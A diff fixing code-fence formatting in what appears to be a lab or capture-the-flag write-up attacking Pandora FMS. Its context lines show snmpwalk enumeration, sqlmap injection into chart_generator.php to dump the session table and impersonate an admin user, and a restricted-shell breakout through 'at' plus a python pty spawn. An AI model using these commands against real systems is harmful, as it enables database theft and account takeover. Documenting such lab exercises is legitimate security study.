@@ -85,7 +85,7 @@ HOP RTT      ADDRESS
 
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 13.12 seconds
-```bash
+```
 
 ```
 snmpwalk -v 1 -c public $target
@@ -119,7 +119,7 @@ sqlmap --url="http://localhost/pandora_console/include/chart_generator.php?sessi
 Obtaining the list of tables in the database
 ```
 sqlmap --url="http://localhost/pandora_console/include/chart_generator.php?session_id=''" -D pandora --tables
-```bash
+```
 ```sql
 Dumping the tsessions_php table in order to obtain a usable session_id value in order to login into the Pandora FMS by impersonating an elevated user, i.e. matt .
 ```bash
@@ -162,7 +162,7 @@ Breaking out from the restricted shell environment
 https://gtfobins.github.io/gtfobins/at/#shell
 ```
 echo "/bin/sh <$(tty) >$(tty) 2>$(tty)" | at now; tail -f /dev/null
-```bash
+```
 ```python
 ```bash
 python3 -c 'import pty;pty.spawn("/bin/bash")'
